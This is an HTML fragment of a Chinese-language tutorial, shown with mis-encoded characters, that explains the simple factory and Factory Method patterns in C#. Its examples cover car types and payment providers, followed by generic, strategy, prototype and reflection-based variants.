<li>ä¸šåŠ¡ä»£ç åªè¯´ï¼šæˆ‘è¦â€œSiemens çš„ PLCâ€</li>
<li>å·¥å‚è´Ÿè´£ï¼šæ€ä¹ˆåˆ›å»ºã€éœ€è¦å“ªäº›å‚æ•°ã€è¦ä¸è¦ç¼“å­˜ã€å¤±è´¥æ€ä¹ˆæŠ¥é”™</li>
</ul>
<h2 data-id="heading-42">å·¥å‚æ–¹æ³•æ¨¡å¼(Factory Method Pattern)</h2>
<h3 data-id="heading-43">1. ç®€å•å·¥å‚ï¼ˆSimple Factoryï¼‰</h3>
<ul>
<li>
<h5 data-id="heading-44">1. ç®€å•å·¥å‚ï¼ˆSimple Factoryï¼‰â€”â€”ä¸€ä¸ªè½¦é—´ç®¡æ‰€æœ‰è½¦å‹</h5>
<p><strong>ç°å®æ¯”å–»</strong>ï¼šå·¥å‚åªæœ‰ä¸€ä¸ªè½¦é—´ï¼Œå·¥äººæ ¹æ®ä½ è¯´çš„å‹å·ï¼ˆâ€œSedanâ€æˆ–â€œSUVâ€ï¼‰ç»„è£…ä¸åŒè½¦ã€‚ç”¨if-elseåˆ¤æ–­ï¼šSedanå°±è£…æ™®é€šé›¶ä»¶ï¼ŒSUVå°±è£…è¶Šé‡é›¶ä»¶ã€‚</p>
<p><strong>ä»£ç æ€ä¹ˆå†™</strong>ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. å®šä¹‰äº§å“æ¥å£ï¼ˆæ±½è½¦ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">ICar</span> {
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Drive</span>()</span>;  <span class="hljs-comment">// è½¦èƒ½å¼€</span>
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Sedan</span> : <span class="hljs-title">ICar</span> {  <span class="hljs-comment">// è½¿è½¦å®ç°</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Drive</span>()</span> =&gt; Console.WriteLine(<span class="hljs-string">"Sedan driving smoothly."</span>);
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">SUV</span> : <span class="hljs-title">ICar</span> {  <span class="hljs-comment">// SUVå®ç°</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Drive</span>()</span> =&gt; Console.WriteLine(<span class="hljs-string">"SUV driving off-road."</span>);
}

<span class="hljs-comment">// 2. ç®€å•å·¥å‚ç±»ï¼ˆè½¦é—´ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">CarFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ICar <span class="hljs-title">CreateCar</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> type</span>)</span> {  <span class="hljs-comment">// é™æ€æ–¹æ³•ï¼Œé¡¾å®¢å…¥å£</span>
        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">"Sedan"</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Sedan();  <span class="hljs-comment">// newè½¿è½¦ï¼Œéšè—ç»†èŠ‚</span>
        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">"SUV"</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> SUV();     <span class="hljs-comment">// new SUV</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"Unknown car type"</span>);  <span class="hljs-comment">// é”™è¯¯ï¼šä¸æ”¯æŒçš„å‹å·</span>
    }
}

<span class="hljs-comment">// 3. ä½¿ç”¨ï¼ˆé¡¾å®¢ä¹°è½¦ï¼‰</span>
<span class="hljs-keyword">var</span> car = CarFactory.CreateCar(<span class="hljs-string">"Sedan"</span>);  <span class="hljs-comment">// åªä¼ å­—ç¬¦ä¸²ï¼Œä¸new</span>
car.Drive();  <span class="hljs-comment">// è¾“å‡ºï¼šSedan driving smoothly.</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¹ˆå†™</strong>ï¼š</p>
<ul>
<li><code>CreateCar</code>æ˜¯å…¥å£ï¼Œifåˆ¤æ–­typeï¼Œnewå¯¹åº”ç±»ã€‚é¡¾å®¢ä¸ç”¨çŸ¥é“Sedanæ€ä¹ˆæ„é€ ã€‚</li>
<li>ä¼˜ç‚¹ï¼šç®€å•ï¼Œæ–°æ‰‹æ˜“å†™ã€‚</li>
<li>ç¼ºç‚¹ï¼šåŠ æ–°è½¦å‹ï¼ˆå¦‚â€œTruckâ€ï¼‰ï¼Œå¾—æ”¹<code>CreateCar</code>çš„ifï¼ˆè¿åâ€œå¼€æ”¾å°é—­â€â€”â€”æ‰©å±•æ—¶ä¸è¯¥æ”¹ç°æœ‰ä»£ç ï¼‰ã€‚</li>
</ul>
<p><strong>å¦‚æœä¸è¿™ä¹ˆåš</strong>ï¼šé¡¾å®¢è‡ªå·±<code>new Sedan()</code>ï¼Œå·¥å‚æ²¡ç”¨ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šäº§å“ç±»å‹å°‘ï¼Œä¸å¸¸åŠ æ–°ã€‚åƒè®¡ç®—å™¨æŒ‰é’®ï¼ˆåŠ å‡ä¹˜é™¤ï¼‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-45">2. å·¥å‚æ–¹æ³•ï¼ˆFactory Methodï¼‰</h3>
<h4 data-id="heading-46">åœºæ™¯ï¼šç”µå•†æ”¯ä»˜ç³»ç»Ÿ</h4>
<ul>
<li>
<p><strong>éœ€æ±‚</strong>ï¼šç”¨æˆ·é€‰æ‹©æ”¯ä»˜æ–¹å¼ï¼ˆæ”¯ä»˜å®ã€å¾®ä¿¡ï¼‰ï¼Œç³»ç»Ÿè°ƒç”¨å¯¹åº”æ”¯ä»˜é€»è¾‘ï¼ˆæ‰£æ¬¾ã€å›è°ƒï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ‰©å±•</strong>ï¼šè€æ¿è¯´åŠ â€œPayPalâ€æ”¯ä»˜ï¼Œä¸èƒ½æ”¹ç°æœ‰ä»£ç ï¼ˆé¿å…ä¸Šçº¿é£é™©ï¼‰ã€‚</p>
</li>
<li>
<p>ç±»ç»“æ„</p>
<ul>
<li><code>IPayment</code>ï¼šæ”¯ä»˜æ¥å£ï¼ˆæ‰£æ¬¾ï¼‰ã€‚</li>
<li>å…·ä½“æ”¯ä»˜ï¼š<code>AlipayPayment</code>ã€<code>WechatPayment</code>ã€<code>PaypalPayment</code>ï¼ˆæ–°åŠ ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-47">ç‰ˆæœ¬1ï¼šç®€å•å·¥å‚ï¼ˆä½ è§‰å¾—â€œç®€å•â€çš„ï¼‰</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. æ”¯ä»˜æ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span>;  <span class="hljs-comment">// æ‰£æ¬¾</span>
}

<span class="hljs-comment">// 2. å…·ä½“æ”¯ä»˜ç±»</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Alipay."</span>);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WechatPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Wechat."</span>);
}

<span class="hljs-comment">// 3. ç®€å•å·¥å‚ï¼ˆä¸€ä¸ªç±»ç®¡æ‰€æœ‰ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IPayment <span class="hljs-title">CreatePayment</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> type</span>)</span> {
        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">"Alipay"</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> AlipayPayment();
        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">"Wechat"</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WechatPayment();
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"Unknown payment type"</span>);
    }
}

<span class="hljs-comment">// 4. ä½¿ç”¨ï¼ˆé¡¾å®¢ä¸‹å•ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">OrderService</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessPayment</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> paymentType, <span class="hljs-built_in">decimal</span> amount</span>)</span> {
        <span class="hljs-keyword">var</span> payment = PaymentFactory.CreatePayment(paymentType);  <span class="hljs-comment">// å·¥å‚åˆ›å»º</span>
        payment.Pay(amount);
    }
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">var</span> service = <span class="hljs-keyword">new</span> OrderService();
service.ProcessPayment(<span class="hljs-string">"Alipay"</span>, <span class="hljs-number">100</span>);  <span class="hljs-comment">// è¾“å‡ºï¼šPaid 100 via Alipay.</span>
</code></pre>
<ul>
<li><strong>æ‰©å±•PayPal</strong>ï¼šå¾—æ”¹<code>PaymentFactory.CreatePayment</code>ï¼ŒåŠ <code>if (type == "Paypal") return new PaypalPayment();</code>ã€‚è¿™æ”¹äº†ç°æœ‰å·¥å‚ä»£ç ï¼Œä¸‡ä¸€å‡ºé”™ï¼Œå½±å“æ”¯ä»˜å®/å¾®ä¿¡ã€‚</li>
<li><strong>é—®é¢˜</strong>ï¼šä½ â€œåªçœ‹åˆ°äº†å¤šåŠ äº†å¥½å‡ ä¸ªæ¥å£â€â€”â€”ç®€å•å·¥å‚æ²¡æ¥å£ï¼Œåªæœ‰ä¸€ä¸ªFactoryç±»ã€‚ä½†æ‰©å±•æ—¶å¾—æ”¹å®ƒï¼Œé£é™©é«˜ã€‚</li>
</ul>
<h4 data-id="heading-48">ç‰ˆæœ¬2ï¼šå·¥å‚æ–¹æ³•ï¼ˆå¤šæ¥å£ç‰ˆæœ¬ï¼‰</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. æ”¯ä»˜æ¥å£ï¼ˆåŒä¸Šï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span>;
}

<span class="hljs-comment">// 2. å…·ä½“æ”¯ä»˜ç±»ï¼ˆåŒä¸Šï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Alipay."</span>);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WechatPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Wechat."</span>);
}

<span class="hljs-comment">// 3. æŠ½è±¡å·¥å‚æ¥å£ï¼ˆæ¯ä¸ªæ”¯ä»˜æœ‰è‡ªå·±çš„å·¥å‚ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function">IPayment <span class="hljs-title">Create</span>()</span>;  <span class="hljs-comment">// å·¥å‚åªç®¡åˆ›å»ºä¸€ç§æ”¯ä»˜</span>
}

<span class="hljs-comment">// 4. å…·ä½“å·¥å‚ç±»ï¼ˆæ”¯ä»˜å®å·¥å‚ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">Create</span>()</span> =&gt; <span class="hljs-keyword">new</span> AlipayPayment();
}

<span class="hljs-comment">// 5. å¾®ä¿¡å·¥å‚</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WechatFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">Create</span>()</span> =&gt; <span class="hljs-keyword">new</span> WechatPayment();
}

<span class="hljs-comment">// 6. ä½¿ç”¨ï¼ˆé¡¾å®¢ä¸‹å•ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">OrderService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPaymentFactory _factory;  <span class="hljs-comment">// æ³¨å…¥å·¥å‚</span>
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">OrderService</span>(<span class="hljs-params">IPaymentFactory factory</span>)</span> {  <span class="hljs-comment">// æ„é€ å‡½æ•°æ³¨å…¥</span>
        _factory = factory;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessPayment</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> {
        <span class="hljs-keyword">var</span> payment = _factory.Create();  <span class="hljs-comment">// ç”¨æ³¨å…¥çš„å·¥å‚</span>
        payment.Pay(amount);
    }
}

<span class="hljs-comment">// 7. DIæ³¨å†Œï¼ˆå¯åŠ¨æ—¶ï¼‰</span>
services.AddSingleton&lt;IPaymentFactory, AlipayFactory&gt;();  <span class="hljs-comment">// é»˜è®¤æ”¯ä»˜å®</span>

<span class="hljs-comment">// æµ‹è¯•ï¼ˆæ¨¡æ‹ŸDIæ³¨å…¥ï¼‰</span>
<span class="hljs-keyword">var</span> factory = <span class="hljs-keyword">new</span> AlipayFactory();  <span class="hljs-comment">// å®é™…é¡¹ç›®DIè‡ªåŠ¨æ³¨å…¥</span>
<span class="hljs-keyword">var</span> service = <span class="hljs-keyword">new</span> OrderService(factory);
service.ProcessPayment(<span class="hljs-number">100</span>);  <span class="hljs-comment">// è¾“å‡ºï¼šPaid 100 via Alipay.</span>

<span class="hljs-comment">// æ‰©å±•PayPalï¼šåªåŠ æ–°ç±»ï¼Œä¸æ”¹è€ä»£ç </span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PaypalPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Paypal."</span>);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PaypalFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">Create</span>()</span> =&gt; <span class="hljs-keyword">new</span> PaypalPayment();
}

<span class="hljs-comment">// DIæ¢æ³¨å†Œ</span>
services.AddSingleton&lt;IPaymentFactory, PaypalFactory&gt;();  <span class="hljs-comment">// æ¢PayPal</span>
<span class="hljs-comment">// OrderServiceä»£ç å®Œå…¨ä¸å˜ï¼</span>
</code></pre>
<ul>
<li>
<p><strong>æ‰©å±•PayPal</strong>ï¼šåªå†™<code>PaypalPayment</code>å’Œ<code>PaypalFactory</code>ï¼ŒåŠ ä¸€è¡ŒDIæ³¨å†Œã€‚è€çš„<code>AlipayFactory</code>ã€<code>WechatFactory</code>ã€<code>OrderService</code>ä¸åŠ¨ã€‚ç¬¦åˆâ€œå¼€æ”¾å°é—­â€â€”â€”æ‰©å±•ä¸æ”¹ç°æœ‰ä»£ç ã€‚</p>
</li>
<li>
<p>å¥½å¤„</p>
<ul>
<li><strong>å®‰å…¨</strong>ï¼šä¸æ”¹è€ä»£ç ï¼Œå°‘bugã€‚ä¸Šçº¿æ—¶ï¼Œè€æ”¯ä»˜ä¸å—å½±å“ã€‚</li>
<li><strong>çµæ´»</strong>ï¼šDIè‡ªåŠ¨æ³¨å…¥å·¥å‚ï¼Œä½¿ç”¨è€…ç±»ï¼ˆOrderServiceï¼‰ä¸newä»»ä½•ä¸œè¥¿ã€‚æµ‹è¯•æ—¶ï¼Œæ³¨å…¥MockFactoryï¼Œæ¨¡æ‹Ÿæ”¯ä»˜ã€‚</li>
<li><strong>å›¢é˜Ÿåä½œ</strong>ï¼šä½ åŠ PayPalï¼Œåˆ«äººç»´æŠ¤æ”¯ä»˜å®ï¼Œä¸å†²çªã€‚</li>
</ul>
</li>
<li>
<p><strong>â€œå¤šåŠ æ¥å£â€</strong> ï¼šæ˜¯çš„ï¼Œå¤šäº†ä¸€ä¸ª<code>IPaymentFactory</code>æ¥å£ï¼Œä½†å®ƒæ¢æ¥æ‰©å±•æ€§ã€‚åœ¨å¤§é¡¹ç›®é‡Œï¼Œè¿™ç‚¹â€œå¤šâ€çœä¸‹ç»´æŠ¤æˆæœ¬ã€‚</p>
</li>
</ul>
<h4 data-id="heading-49">å¯¹æ¯”æ€»ç»“</h4>



































<table><thead><tr><th>æ–¹é¢</th><th>ç®€å•å·¥å‚</th><th>å·¥å‚æ–¹æ³•</th></tr></thead><tbody><tr><td><strong>æ‰©å±•æ–°æ”¯ä»˜</strong></td><td>æ”¹Factory ifï¼Œé£é™©é«˜</td><td>åŠ æ–°ç±»+DIï¼Œä¸æ”¹è€ä»£ç </td></tr><tr><td><strong>ä»£ç æ”¹åŠ¨</strong></td><td>æ”¹ç°æœ‰Factory</td><td>åªåŠ æ–°æ–‡ä»¶</td></tr><tr><td><strong>æµ‹è¯•</strong></td><td>éš¾mockæ”¯ä»˜é€»è¾‘</td><td>æ˜“æ³¨å…¥MockFactory</td></tr><tr><td><strong>DIé›†æˆ</strong></td><td>ä¸æ˜“</td><td>å®Œç¾</td></tr><tr><td><strong>é€‚ç”¨</strong></td><td>å°é¡¹ç›®ï¼Œæ”¯ä»˜å›ºå®š</td><td>å¤§é¡¹ç›®ï¼Œç»å¸¸åŠ æ–°æ”¯ä»˜</td></tr></tbody></table>
<p>åœ¨è¿™ä¸ªæ”¯ä»˜æ¡ˆä¾‹é‡Œï¼Œå·¥å‚æ–¹æ³•â€œå¥½ç”¨â€å› ä¸ºç”µå•†Appå¸¸åŠ æ–°æ”¯ä»˜ï¼ˆæ¯”å¦‚åŠ Apple Payï¼‰ï¼Œä½ ä¸æƒ³æ¯æ¬¡ä¸Šçº¿æ—¶å†’é£é™©æ”¹æ ¸å¿ƒä»£ç ã€‚åƒæ”¯ä»˜å®/å¾®ä¿¡çš„SDKï¼Œå…¶å®èƒŒåç”¨ç±»ä¼¼æ¨¡å¼ã€‚</p>
<pre><code class="hljs language-erlang" lang="erlang">å¦‚ä¸Š,æœ€å¤§çš„å¥½å¤„å°±æ˜¯,ç»Ÿä¸€æˆ‘è¿™ä¸€å—çš„åŠŸèƒ½,éƒ½é€šè¿‡ä¸€ä¸ªå·¥å‚åˆ›å»ºå‡ºæ¥å¯¹è±¡.
è¿™æ ·æˆ‘å·¥å‚åˆ›å»ºå‡ºæ¥çš„å¯¹è±¡,ç›´æ¥ç”¨å°±å¥½äº†.

ç„¶åè¿™ä¸ªå¯¹è±¡,åˆæ˜¯ä¸€ä¸ªæŠ½è±¡å¯¹è±¡,æˆ‘å®šä¹‰å›ºå®šçš„åŠŸèƒ½.è®©å·¥å‚åˆ›å»ºæˆ‘æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨äº†,çº¦å®šä¿—æˆçš„åŠŸèƒ½.
ç„¶åæˆ‘è¿™ä¸ªæŠ½è±¡å¯¹è±¡å¯ä»¥æœ‰å¤šä¸ªå®ç°,é€šè¿‡æ›¿æ¢æŠ½è±¡å¯¹è±¡ä¸å®ç°,æ¥è¾¾æˆå¤šä¸ªå¯¹è±¡åŠŸèƒ½çš„è§£è€¦.
</code></pre>
<h3 data-id="heading-50">å·¥å‚æ–¹æ³•è®¾è®¡æ¨¡å¼æ‰©å±•</h3>
<h4 data-id="heading-51">æ³›å‹å·¥å‚æ–¹æ³•ï¼ˆGeneric Factory Methodï¼‰</h4>
<p>ç”¨C#æ³›å‹ï¼Œè®©å·¥å‚é€šç”¨ï¼Œé¿å…é‡å¤ä»£ç ã€‚</p>
<p><strong>æ‰©å±•</strong>ï¼šå·¥å‚æ¥å£ç”¨æ³›å‹ï¼Œåˆ›å»ºä»»æ„ç±»å‹ã€‚</p>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IFactory</span>&lt;<span class="hljs-title">T</span>&gt; {
    <span class="hljs-function">T <span class="hljs-title">Create</span>()</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PaymentFactory</span>&lt;<span class="hljs-title">T</span>&gt; : <span class="hljs-title">IFactory</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">where</span> <span class="hljs-title">T</span> : <span class="hljs-title">IPayment</span>, <span class="hljs-title">new</span>() {
    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">Create</span>()</span> =&gt; <span class="hljs-keyword">new</span> T();
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">var</span> factory = <span class="hljs-keyword">new</span> PaymentFactory&lt;AlipayPayment&gt;();
<span class="hljs-keyword">var</span> payment = factory.Create();
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šä»£ç å¤ç”¨ï¼Œå°‘å†™ç±»ã€‚é€‚åˆç®€å•äº§å“ã€‚</p>
<h4 data-id="heading-52">ç»“åˆç­–ç•¥æ¨¡å¼ï¼ˆStrategy + Factory Methodï¼‰</h4>
<p>å·¥å‚æ–¹æ³•åˆ›å»ºäº§å“ï¼Œç­–ç•¥æ¨¡å¼è®©äº§å“è¡Œä¸ºå¯æ¢ã€‚</p>
<p><strong>æ‰©å±•</strong>ï¼šæ”¯ä»˜å™¨ç”¨ç­–ç•¥å°è£…æ‰£æ¬¾é€»è¾‘ã€‚</p>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPayStrategy</span> {
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayStrategy</span> : <span class="hljs-title">IPayStrategy</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Strategy: Paid <span class="hljs-subst">{amount}</span> via Alipay."</span>);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function">IPayment <span class="hljs-title">Create</span>(<span class="hljs-params">IPayStrategy strategy</span>)</span>;  <span class="hljs-comment">// æ³¨å…¥ç­–ç•¥</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">Create</span>(<span class="hljs-params">IPayStrategy strategy</span>)</span> =&gt; <span class="hljs-keyword">new</span> AlipayPayment(strategy);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPayStrategy _strategy;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AlipayPayment</span>(<span class="hljs-params">IPayStrategy strategy</span>)</span> { _strategy = strategy; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; _strategy.Execute(amount);
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">var</span> strategy = <span class="hljs-keyword">new</span> AlipayStrategy();
<span class="hljs-keyword">var</span> factory = <span class="hljs-keyword">new</span> AlipayFactory();
<span class="hljs-keyword">var</span> payment = factory.Create(strategy);
payment.Pay(<span class="hljs-number">100</span>);  <span class="hljs-comment">// Strategy: Paid 100 via Alipay.</span>
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šè¡Œä¸ºå¯æ‰©å±•ï¼Œæµ‹è¯•æ—¶æ¢MockStrategyã€‚</p>
<h4 data-id="heading-53">å·¥å‚æ–¹æ³• + åŸå‹æ¨¡å¼ï¼ˆPrototype + Factoryï¼‰</h4>
<p>äº§å“å¤æ‚æ—¶ï¼Œç”¨åŸå‹å…‹éš†ï¼Œé¿å…é‡å¤æ„é€ ã€‚</p>
<p><strong>æ‰©å±•</strong>ï¼šå·¥å‚å…‹éš†åŸå‹ã€‚</p>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPayment</span> : <span class="hljs-title">ICloneable</span> {
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Alipay."</span>);
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">object</span> <span class="hljs-title">Clone</span>()</span> =&gt; MemberwiseClone();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function">IPayment <span class="hljs-title">Create</span>()</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPayment _prototype = <span class="hljs-keyword">new</span> AlipayPayment();
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">Create</span>()</span> =&gt; (IPayment)_prototype.Clone();
}
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šæ„é€ æˆæœ¬é«˜æ—¶ï¼Œå…‹éš†å¿«ã€‚</p>
<h4 data-id="heading-54">å·¥å‚æ–¹æ³•åœ¨æ¡†æ¶ä¸­çš„æ‰©å±•ï¼ˆåƒ.NETçš„Activatorï¼‰</h4>
<p>ç”¨åå°„ï¼Œè®©å·¥å‚åŠ¨æ€åˆ›å»ºä»»æ„ç±»ã€‚</p>
<p>C#</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicFactory</span> : <span class="hljs-type">IPaymentFactory</span> {
    <span class="hljs-keyword">public</span> IPayment Create() {
        <span class="hljs-keyword">var</span> type = Type.GetType(<span class="hljs-string">"AlipayPayment"</span>);  <span class="hljs-comment">// åŠ¨æ€</span>
        <span class="hljs-keyword">return</span> (IPayment)Activator.CreateInstance(type);
    }
}
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šé…ç½®é©±åŠ¨ï¼Œè¿è¡Œæ—¶å†³å®šäº§å“ã€‚</p>
